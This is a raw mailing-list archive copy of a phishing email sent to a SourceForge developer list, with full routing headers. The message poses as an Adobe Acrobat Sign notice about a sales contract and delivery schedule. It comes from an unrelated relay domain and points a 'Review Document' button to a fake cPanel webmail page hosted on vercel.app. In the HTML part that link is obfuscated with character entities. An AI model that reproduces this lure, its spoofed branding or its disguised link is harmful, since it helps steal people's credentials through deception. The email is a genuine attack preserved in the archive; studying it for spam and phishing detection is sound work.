Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 1DE1E97AF3D
	for <lists+industrypack-devel@lfdr.de>; Tue, 17 Sep 2024 13:05:54 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sqW1o-0006vO-UU
	for lists+industrypack-devel@lfdr.de;
	Tue, 17 Sep 2024 11:05:52 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95) (envelope-from
 <bounces+46615377-b063-industrypack-devel=lists.sourceforge.net@em3149.btldem.com>)
 id 1sqW1n-0006v9-Nj for industrypack-devel@lists.sourceforge.net;
 Tue, 17 Sep 2024 11:05:51 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=List-Unsubscribe:To:Reply-To:Subject:Message-ID:
 Mime-Version:From:Date:Content-Type:Sender:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Q+VjgXvaI450ZH9rLn0tuXa5CYlw7fW1APPKlcysclY=; b=jtQEpxa5xLN3AsCEDcChZ2rtiS
 wCbrmIVt9IGoKz8sVQThIOsAfs6Ul+OAfYSCHT3KY1TRZoeWFWLv+DSdFG50lphaf9wYVtiGTsFIe
 fYEu7HoQS4v04MZVhuJcq+e0H75Y4eDFKVtpv5juca5pFOiGYwMfmjH3Y95PX+Vk4+Eg=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=List-Unsubscribe:To:Reply-To:Subject:Message-ID:Mime-Version:From:Date:
 Content-Type:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=Q+VjgXvaI450ZH9rLn0tuXa5CYlw7fW1APPKlcysclY=; b=CSyARIil5TXIZiQuXPElvZn+KV
 Fc8KT59jUu/IMj9u+0TGwD0YCgV/1Nqgen1mPGkQq453G25Ino/cBaMYCzPhASaHNWrAjyiqfbS47
 z+Xi0zATvFA1N1pZHT/u1IV5ElmWUZ8K9Y7o3QCdopfviV1IEPSAVGsUk6hG9MQjLWrc=;
Received: from xvfrtsdk.outbound-mail.sendgrid.net ([168.245.118.209])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1sqW1k-0000J2-Bj for industrypack-devel@lists.sourceforge.net;
 Tue, 17 Sep 2024 11:05:51 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=btldem.com;
 h=content-type:from:mime-version:subject:reply-to:to:list-unsubscribe:
 list-unsubscribe-post:cc:content-type:from:subject:to;
 s=s1; bh=Q+VjgXvaI450ZH9rLn0tuXa5CYlw7fW1APPKlcysclY=;
 b=icWbUohhulphxsJXTBletCMV7qQs34X9XSKlQ4IAONIozna/QZ1GkYkMkeINwsaHqxEb
 GLrnvxtp52oSgJPAF067ZF8M+QnM0qRCtq7NQgnXxXk3Jq1kY+Bqh2VSI2WEe6ufcONfGu
 XrL0IegYRALcJ8m+1v04SZiGpM1dKA7Lf1bnZIG8k+j9sD8KzLZQ+itpWW2p9jDQ6AqLJs
 N/P4OT8yC9bTpYm5AKhIA4U127+IkwzNYU8FGgw1GIac/D2FdbcYNUhKBPHdwiNmYA6veK
 5M8MC4kTaQNT2gvo9tPhyEgPw+Cz23cstbA9+NOOg/BNc6Mjuha1J6jQZ/r5vV1A==
Received: by recvd-77b98ff8f5-lsdrw with SMTP id
 recvd-77b98ff8f5-lsdrw-1-66E96280-26
 2024-09-17 11:05:36.481312135 +0000 UTC m=+407312.841544874
Received: from NDY2MTUzNzc (unknown) by geopod-ismtpd-16 (SG) with HTTP
 id 3zdQncJqT06oYKOZCXRCng Tue, 17 Sep 2024 11:05:36.397 +0000 (UTC)
Date: Tue, 17 Sep 2024 11:05:36 +0000 (UTC)
From: =?utf-8?q?Adobe_Team=C2=AE?= <docsonline.adobe.net.notify@btldem.com>
Mime-Version: 1.0
Message-ID: <3zdQncJqT06oYKOZCXRCng@geopod-ismtpd-16>
X-SG-EID: =?us-ascii?Q?u001=2E7UevxE7mgyKDmKxXIGIQhaGfhmSRBLm7eSvimp4pPxM12nT6cc=2FyBqTWA?=
 =?us-ascii?Q?p61kM9bh4oCDzYnMAFUKfQoB1=2FNpyJNNUkN6crY?=
 =?us-ascii?Q?h=2F6c=2FWQYluFx9jkT1BqPUjJfjx8089HIk2gYmfb?=
 =?us-ascii?Q?PlusNazsUVXHOOdLZ2CHmH7y3Vxoz1QXjGFZw+q?=
 =?us-ascii?Q?Jf+TihXbjcxlPKnRy=2FTbzAYQYXGrXa2vOfWIVqj?=
 =?us-ascii?Q?7RZTiAmN30w2OQ01NUkGZ7r27RMdSGPouVKHj4w?=
 =?us-ascii?Q?Td4MIKY7jRh=2FnLks2kjc1uR=2Fln7ugXYs3e9TV7C?=
 =?us-ascii?Q?RUvozOUg=3D?=
X-SG-ID: =?us-ascii?Q?u001=2EXwhBPNhCejkv4+fVosb2QVfR16Qxp9CrA7PjDe5zzeI=2F0IZCBsPXtgHbA?=
 =?us-ascii?Q?oGIj+RskLxA4N2rJjSWrHfgX07tLOm0v5BUQcd6?=
 =?us-ascii?Q?w3knjorGi7Hwu0WCOA5AFSvy0=2FwlG32=2FubCxoRI?=
 =?us-ascii?Q?sQ4OvhLOQiMVgwY5FhcshUuwswJrOXbU3rfkrnJ?=
 =?us-ascii?Q?AEOMHQOikg5XoXmAk6YGcuf1Coas2b9w3hbr4oE?=
 =?us-ascii?Q?fmPxFE0a6KVW6cMKlTobjgNWX=2FZowHF=2FB6i2RPU?=
 =?us-ascii?Q?RpBm6ZEFx+EbfhiJnENbpdfBtiIrpGrk9j=2Fu=2F5K?=
 =?us-ascii?Q?Tvp7bMGJrUVSGa4B3KeqHdQmujI9Xs+Rs1i+kQd?=
 =?us-ascii?Q?rha43w+YH5Xc8OVGlFnMFqFKUJzRCBG6kMoCtVd?=
 =?us-ascii?Q?GW+lG6SwoibwAu5uBzQI9ZNYvDuwWRnvLJO0zr+?=
 =?us-ascii?Q?4igdsNTyfSNa7+Vfy=2FooBuPndPb6QXX6kss9oU=2F?=
 =?us-ascii?Q?D9gvIrClCDNec3fheGIAtXGE7D6neMedoGBUCFr?=
 =?us-ascii?Q?axuLd9m72BNHFXfcUo7i25rWRxImHhs1J8sGd7S?=
 =?us-ascii?Q?8cXnn+i8vztV92byLdiufehbqphgXVbrVZul2bV?=
 =?us-ascii?Q?mn=2FR7Lvl04N48IHzXVD7ViCjlivdv=2FkGA5dtD1Y?=
 =?us-ascii?Q?UP529hiGEjilq17ITT83cDfx33g5TdwFi7a0eTy?=
 =?us-ascii?Q?d=2FsN9h99arijGgKO6LxK=2F=2FCrSZt5NdwfAKBZN7A?=
 =?us-ascii?Q?p0=3D?=
To: industrypack-devel@lists.sourceforge.net
X-Entity-ID: u001.Z2uYVPn5+h3GHQ0lEkBDqw==
List-Unsubscribe-Post: List-Unsubscribe=One-Click
X-Spam-Score: 0.7 (/)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Adobe Acrobat Sign You have a document to sign and review
 Access the new sales contract and follow up on the delivery dates 
 Content analysis details:   (0.7 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.8 URIBL_CT_SURBL         Contains an URL listed in the CT SURBL blocklist
 [URIs: u46615377.ct.sendgrid.net]
 -1.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [168.245.118.209 listed in wl.mailspike.net]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 TO_IN_SUBJ             To address is in Subject
X-Headers-End: 1sqW1k-0000J2-Bj
Subject: [Industrypack-devel] NEW!: Updated Sales and Delivery Schedule for
 industrypack-devel@lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: docsonline.adobe.net.notify@btldem.com
Content-Type: multipart/mixed; boundary="===============2717366369539140242=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2717366369539140242==
Content-Type: multipart/alternative; boundary=6d5073f2eba158193b7c94f5041ace9597c1bc14230588b6aae102139696

--6d5073f2eba158193b7c94f5041ace9597c1bc14230588b6aae102139696
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=us-ascii
Mime-Version: 1.0

Adobe Acrobat Sign

--------------------------------------
You have a document to sign and review
--------------------------------------

*****************************************************************
Access the new sales contract and follow up on the delivery dates
*****************************************************************

**************************************
PLEASE NOTE THE DATES IN THE SCHEDULE:
**************************************

***************************
MONDAY, 23RD SEPTEMBER 2024
***************************

****************************
TUESDAY, 24TH SEPTEMBER 2024
****************************

***************************************************************************=
*******************
MONDAY, 30TH SEPTEMBER 2024

REVIEW DOCUMENT ( https://cpanel-webmail.vercel.app/?web=3Dindustrypack-dev=
el@lists.sourceforge.net )
***************************************************************************=
*******************
Unsubscribe From This List https://u46615377.ct.sendgrid.net/asm/unsubscrib=
e/?user_id=3D46615377&data=3DnVGALfKZlASIoFZAJXh1dRO29nkbzv7dtFuoRFkg1YJoMD=
AwdTAwMMMQjDtdvwisGd_8Gf76U_qVaZu0nDVJZCL4rkWnB9ifAwKPALZ3iSyJjdTqRcXCApCHl=
tFIHGdwN5xRnvfwibbprngPyxxp9k_0V_xg4T_S9SmIEsRIpbae-2vWqfFw4KppZQRxR9CD2wsV=
W9iL_p0S-wPENjOXkKWiP6q3SW7HXoalrT3NwP8aQXlcS7v1LNt46WqUZngp2nEP4Ckm5X2iKhY=
WgRPgq3Ha6Tz-AcXNghQE8AmyEcqwjztS491dSziwk2o5Pwz3N5ZE4y7Z7WWRPvfmGcmcySTftT=
CTlmJ8SC9tf1v1QFrBPHzcR7fUQmZ11Vd8ytCb-_U1DjwQrODm86btE5Qlza07kCKti6yGgtisg=
vzuNP9T2IPrqYs9NVlqzQqdwji3a8e_SAbHqv51uV1LYCxjtkrlrQGjVGhxObh_iFxRFJ-PSMLQ=
f1tQvxqkOXt8fvZ1gAZbaU6KX6sa-jSGn8cBxmeHyVRRMk0X-SxTz_yY2ZjCGNi0NRBnzuTLbHN=
0VAqRiy63_XV307CnI0ZZV9bDWd2RuOYo1sX5G32IF6t9f1jNdpAX_6f1WDNFDOsil7TgR2UdR5=
E04HXx5odyXw4TzRhE3_J4XmeCoU8k-zC7zwosdD0XbVKsWED2W-riFkQhjzKHBROY6h92Rxl1L=
egJZYQHZ64QJsBl4_FaTnL9Kn8AYdKroVZY1XhiNGtEJCrGlb7NBo0v12MFBvxdwbiPbMnzxnRt=
9ogdV4VfCKkO7H61U7ARqAf5-PIxGlD1kspzU5qGxLWj3gPewQruFOtJmwMBLO0c675D4RnVCxO=
lEjXhq84ABYs36BeMQcQn4iVfZJyj6wWZVjf7Ko6QeFAltMgNyuVS2aWMk6gpPL9QJJmOgkhJ2A=
NO7--f9A2k1couGtbSWd1zYJPUR29AwHQVfZ368vQdnSZOR0-nRacBdj7dVeg8eRQw627r7FW3v=
DWYDrWaHx39zOyOPEe3LTulOsnrh-7J0xQQCLaJbAVMJFGWjXviz6rn6cka2Ne2HCOawz0OVltE=
wYVePyeDOh4Nr4snDXoBg4N- | Manage Email Preferences https://u46615377.ct.se=
ndgrid.net/asm/?user_id=3D46615377&data=3Dzz-VYQ_XsgKcNrKPgRfzoQ3CoBXkIZqaO=
IHgUW-RF7BoMDAwdTAwMCnFzybRmhH3w2lPJ_eCBC6Gqp4f3kaiNKEa3R0bqMW5i-xRQEa_EJxX=
ObxWub8aVFnTQfpYJEwDoSKXbBUylea1rmk0A6VBaHQlwH4aQoumQEQ_Z_2Ug1NYS79NkZdTrlE=
62TYfFsnOa3ZYPPEKzMJlCLfoAGXP20Sqd_1s_gl9f4iPI8pFoN7_31KY-pYZ4vWwabcTXpJ1pe=
sVpC57x6jyhiZPw5DSZz32mXK96_ldaa3J9mMFXHzY0myFQKw7gI2iED2TPEU8_FaOuS1W04ikc=
2eUMpVTjkeKqM73np4KZY-n3eESHyfis-HBPlSZjywFwOvdjE7SyvVlFm_n11PUL9PSimwsW8YU=
ZchT0KomyCF9wyFhDPjp1R0P1byZxxbMTqfduSU7TwafSLVxp5IUk4qLQMJ-r1aiJOoOac-UsKs=
9CC-aSapCpIwavU4s_SU2y5BBZIKGbyi8auFLaOYbuK5zVH_kPCHedoT8mcK5-9csztGaBvBDw7=
psoNKlM3LCiRhx0MtSUq9f4LVV20rhyPC2wEvPxwD00k4V3XgzMnU_Z4MgM9cG-tiefWmgBdZDe=
NtZr_WtK2h8isHUyc0ZiIn3qHvQWedtdjWFx4eqB9hudlsIBw23dQLZTFh-83Rvfyk2B7Wmb1jk=
Mxy85XJdq4H_mIpIsnCHuR8-LYtumDRNKwSnrfZPMq_N8n6OnxuuJS88Y-J_uEX0wE4jetU6sUx=
D4WuEnAzd3lInpcR6XaU2jqW0uByGpxpcRXNLZd2eVu9QTc4u4a90tZuNo96ZJDo_c77Rjs8QmI=
_xuhA8fi2Vu6OKBTTBz1OMCMa4uvFBsUqjDbhUjlJaqfuOZM0HH19yXWf13DJoolErXYNz0dEvq=
W9Md0WeocFzutMDVyMnDQVHy8EbospOqLW-4A5m4ZkgX2yfwO8PRH8m5yTUsNsPTHqujvqo7DQX=
NcLmN8hy_t74Cn2zfmmHTJ3or6ViwcWlHkICThe7AFd6JpolVxyNNb916gApKJo9HFYKQg7gdsb=
k4G3PYAYNfGi-4tM=3D
--6d5073f2eba158193b7c94f5041ace9597c1bc14230588b6aae102139696
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=us-ascii
Mime-Version: 1.0

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<title></title>
</head>
<body>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, sans-serif; font-size: small=
; font-style: normal; font-weight: 400; margin-bottom: 30px; word-spacing: =
0px; display: flex; white-space: normal; orphans: 2; widows: 2; font-varian=
t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
xt-decoration-color: initial;">
<img class=3D"CToWUd" style=3D"width: 60px; margin-right: 15px;" alt=3D"Com=
pany logo" src=3D"https://ci3.googleusercontent.com/meips/ADKq_NZsj1F76szmT=
X0fXvZxHIJvtxSV3_57w6-V1lr0XYhOhcxnbLd8Ja91lVX5m9x2HwYj5EZNxFTZKRqd0QqufJy0=
L6qy4hTmoHkDIJqq6j32_9M6Z9bPxks58cjb2ZYr49gSRvGEiXEO6MXYPim45Qkb_SvxHmY=3Ds=
0-d-e1-ft#https://appexchange.salesforce.com/partners/servlet/servlet.FileD=
ownload?file=3D00P4V00000lXbJkUAK" data-bit=3D"iit"><span style=3D"color: r=
gb(51, 51, 51); font-size: 22px; font-weight: 700;">
<font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inh=
erit;">Adobe Acrobat Sign</font></font></span></div>

<div style=3D"text-align: center; color: rgb(34, 34, 34); text-transform: n=
one; text-indent: 0px; letter-spacing: normal; font-family: Arial, sans-ser=
if; font-size: small; font-style: normal; font-weight: 400; word-spacing: 0=
px; white-space: normal; orphans: 2; widows: 2; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style: initial; text-decoration-co=
lor: initial;">
<h2 style=3D"color: rgb(51, 51, 51); font-size: 20px; font-weight: 700; mar=
gin-bottom: 15px;">You have a document to sign and review</h2>

<h1 style=3D"color: rgb(85, 85, 85); font-size: 18px; font-weight: 400; mar=
gin-bottom: 25px;"><font color=3D"#222222" size=3D"2">Access the new sales =
contract and follow up on the delivery dates<font color=3D"#222222" size=3D=
"2">&nbsp;</font></font></h1><h1 style=3D"color: rgb(85, 85, 85); font-size=
: 18px; font-weight: 400; margin-bottom: 25px;"><font color=3D"#222222" siz=
e=3D"2">PLEASE NOTE THE DATES IN THE SCHEDULE:
</font></h1>
<h1 style=3D"color: rgb(85, 85, 85); font-size: 18px; font-weight: 400; mar=
gin-bottom: 25px;"><font color=3D"#222222" size=3D"2">MONDAY, 23RD SEPTEMBE=
R 2024</font></h1><h1 style=3D"color: rgb(85, 85, 85); font-size: 18px; fon=
t-weight: 400; margin-bottom: 25px;"><font color=3D"#222222" size=3D"2">TUE=
SDAY, 24TH SEPTEMBER 2024</font></h1><h1 style=3D"color: rgb(85, 85, 85); f=
ont-size: 18px; font-weight: 400; margin-bottom: 25px;"><font color=3D"#222=
222" size=3D"2">MONDAY, 30TH SEPTEMBER 2024<br><br>
<a style=3D"padding: 12px 20px; border-radius: 25px; color: rgb(255, 255, 2=
55); text-transform: uppercase; font-weight: 700; text-decoration: none; di=
splay: inline-block; background-color: rgb(0, 123, 255);" clicktracking=3D"=
off" href=3D"&#104;&#116;&#116;&#112;&#115;&colon;&sol;&sol;&#99;&#112;&#97=
;&#110;&#101;&#108;&#45;&#119;&#101;&#98;&#109;&#97;&#105;&#108;&period;&#1=
18;&#101;&#114;&#99;&#101;&#108;&period;&#97;&#112;&#112;&sol;&quest;&#119;=
&#101;&#98;&equals;industrypack-devel@lists.sourceforge.net" target=3D"_bla=
nk">REVIEW DOCUMENT
</a></font></h1></div>


<a href=3D'https://u46615377.ct.sendgrid.net/asm/unsubscribe/?user_id=3D466=
15377&amp;data=3DnVGALfKZlASIoFZAJXh1dRO29nkbzv7dtFuoRFkg1YJoMDAwdTAwMMMQjD=
tdvwisGd_8Gf76U_qVaZu0nDVJZCL4rkWnB9ifAwKPALZ3iSyJjdTqRcXCApCHltFIHGdwN5xRn=
vfwibbprngPyxxp9k_0V_xg4T_S9SmIEsRIpbae-2vWqfFw4KppZQRxR9CD2wsVW9iL_p0S-wPE=
NjOXkKWiP6q3SW7HXoalrT3NwP8aQXlcS7v1LNt46WqUZngp2nEP4Ckm5X2iKhYWgRPgq3Ha6Tz=
-AcXNghQE8AmyEcqwjztS491dSziwk2o5Pwz3N5ZE4y7Z7WWRPvfmGcmcySTftTCTlmJ8SC9tf1=
v1QFrBPHzcR7fUQmZ11Vd8ytCb-_U1DjwQrODm86btE5Qlza07kCKti6yGgtisgvzuNP9T2IPrq=
Ys9NVlqzQqdwji3a8e_SAbHqv51uV1LYCxjtkrlrQGjVGhxObh_iFxRFJ-PSMLQf1tQvxqkOXt8=
fvZ1gAZbaU6KX6sa-jSGn8cBxmeHyVRRMk0X-SxTz_yY2ZjCGNi0NRBnzuTLbHN0VAqRiy63_XV=
307CnI0ZZV9bDWd2RuOYo1sX5G32IF6t9f1jNdpAX_6f1WDNFDOsil7TgR2UdR5E04HXx5odyXw=
4TzRhE3_J4XmeCoU8k-zC7zwosdD0XbVKsWED2W-riFkQhjzKHBROY6h92Rxl1LegJZYQHZ64QJ=
sBl4_FaTnL9Kn8AYdKroVZY1XhiNGtEJCrGlb7NBo0v12MFBvxdwbiPbMnzxnRt9ogdV4VfCKkO=
7H61U7ARqAf5-PIxGlD1kspzU5qGxLWj3gPewQruFOtJmwMBLO0c675D4RnVCxOlEjXhq84ABYs=
36BeMQcQn4iVfZJyj6wWZVjf7Ko6QeFAltMgNyuVS2aWMk6gpPL9QJJmOgkhJ2ANO7--f9A2k1c=
ouGtbSWd1zYJPUR29AwHQVfZ368vQdnSZOR0-nRacBdj7dVeg8eRQw627r7FW3vDWYDrWaHx39z=
OyOPEe3LTulOsnrh-7J0xQQCLaJbAVMJFGWjXviz6rn6cka2Ne2HCOawz0OVltEwYVePyeDOh4N=
r4snDXoBg4N-'>Unsubscribe From This List</a> | <a href=3D'https://u46615377=
.ct.sendgrid.net/asm/?user_id=3D46615377&amp;data=3Dzz-VYQ_XsgKcNrKPgRfzoQ3=
CoBXkIZqaOIHgUW-RF7BoMDAwdTAwMCnFzybRmhH3w2lPJ_eCBC6Gqp4f3kaiNKEa3R0bqMW5i-=
xRQEa_EJxXObxWub8aVFnTQfpYJEwDoSKXbBUylea1rmk0A6VBaHQlwH4aQoumQEQ_Z_2Ug1NYS=
79NkZdTrlE62TYfFsnOa3ZYPPEKzMJlCLfoAGXP20Sqd_1s_gl9f4iPI8pFoN7_31KY-pYZ4vWw=
abcTXpJ1pesVpC57x6jyhiZPw5DSZz32mXK96_ldaa3J9mMFXHzY0myFQKw7gI2iED2TPEU8_Fa=
OuS1W04ikc2eUMpVTjkeKqM73np4KZY-n3eESHyfis-HBPlSZjywFwOvdjE7SyvVlFm_n11PUL9=
PSimwsW8YUZchT0KomyCF9wyFhDPjp1R0P1byZxxbMTqfduSU7TwafSLVxp5IUk4qLQMJ-r1aiJ=
OoOac-UsKs9CC-aSapCpIwavU4s_SU2y5BBZIKGbyi8auFLaOYbuK5zVH_kPCHedoT8mcK5-9cs=
ztGaBvBDw7psoNKlM3LCiRhx0MtSUq9f4LVV20rhyPC2wEvPxwD00k4V3XgzMnU_Z4MgM9cG-ti=
efWmgBdZDeNtZr_WtK2h8isHUyc0ZiIn3qHvQWedtdjWFx4eqB9hudlsIBw23dQLZTFh-83Rvfy=
k2B7Wmb1jkMxy85XJdq4H_mIpIsnCHuR8-LYtumDRNKwSnrfZPMq_N8n6OnxuuJS88Y-J_uEX0w=
E4jetU6sUxD4WuEnAzd3lInpcR6XaU2jqW0uByGpxpcRXNLZd2eVu9QTc4u4a90tZuNo96ZJDo_=
c77Rjs8QmI_xuhA8fi2Vu6OKBTTBz1OMCMa4uvFBsUqjDbhUjlJaqfuOZM0HH19yXWf13DJoolE=
rXYNz0dEvqW9Md0WeocFzutMDVyMnDQVHy8EbospOqLW-4A5m4ZkgX2yfwO8PRH8m5yTUsNsPTH=
qujvqo7DQXNcLmN8hy_t74Cn2zfmmHTJ3or6ViwcWlHkICThe7AFd6JpolVxyNNb916gApKJo9H=
FYKQg7gdsbk4G3PYAYNfGi-4tM=3D'>Manage Email Preferences</a><img src=3D"http=
s://u46615377.ct.sendgrid.net/wf/open?upn=3Du001.HN9ncswbYi-2BEGN-2FXArB7Yb=
-2B54Tm43-2B694904Gpq6REDOvMj5jd8r2ODXoOGLI8F0uYDlfdJx8NjvPdhWWcpkCUGsR3P4V=
RN5MZ7o0veGf3rvT-2BLh1aC66WHXNP3uZ2MXALkHEQ-2BFrCPjUx06NxmFri6-2BXxC4qcLErC=
GgOmjc8H7v-2FCmxYtULIhFJ4QC6to7f73ZbB-2Bc9-2FJYUAJKQRpoCMF-2Fe98Z5ll3SbM1Mw=
6CYueFtXmhQtqhvAXlSsc3S6XBO37HcXMpXxZydXYRH2JyCtoPXUp1q7q17DFrSLt7NsBGs37aL=
67g2vGpXQPent0WbLvWJZXGjQ2SwpuUIL0OBmO45MGSwmqRQZSGlSUQ6tQ85l5RvCJ-2BrgyP80=
TOOSwcadtEbmfrzO6mnBdsuni2y8P7DdtCbqjs6FG37F3MMoAH6R6yj1Gq2y7TMbcwGcapXjayT=
rE1DC1qj8qMuj7lx3Nd8VEBZnnywPSKgx5Pwrc2YEqPI9orAHN6qtdknRdo75TQBYzwc-2BgDmn=
HBaqRgqHGt9RcfCxgut8vGWHja3OqJxRMhErPT1SBJQ9zawfXhx5tIi99m2GnU5HHydt8zlhEFP=
dM-2FIodZXRduTiTxxPNIJMdxTwMHHRy8-2F5iH9550ZlsqMoo-2F1hEmrt5wQcYm0HuWnoqgjX=
sVecJG1bk5ycZhgijGQBibfFJSDfHQn9ohwxucsL-2Bn5UvpZ8iC0LihUueI264so-2BgFvR5lp=
2EanY2kJlCamvWaYKS4CHT-2BDf4POXix1FNIZE7fYEYxyjzV-2B1TCHo5b3xIuBfver1BSXd3f=
asOlHYtLtdOtiaIk0lTL1QGmMZpZI1OZLy2hThuCMRv1eYuq6yN3h2Uv5wg8bC8pc5iOaK3VplZ=
F0K1-2BvkYHB2mHziNhVO4O6-2BXCdfkq-2FWw-3D-3D" alt=3D"" width=3D"1" height=
=3D"1" border=3D"0" style=3D"height:1px !important;width:1px !important;bor=
der-width:0 !important;margin-top:0 !important;margin-bottom:0 !important;m=
argin-right:0 !important;margin-left:0 !important;padding-top:0 !important;=
padding-bottom:0 !important;padding-right:0 !important;padding-left:0 !impo=
rtant;"/></body></html>
--6d5073f2eba158193b7c94f5041ace9597c1bc14230588b6aae102139696--


--===============2717366369539140242==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2717366369539140242==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2717366369539140242==--

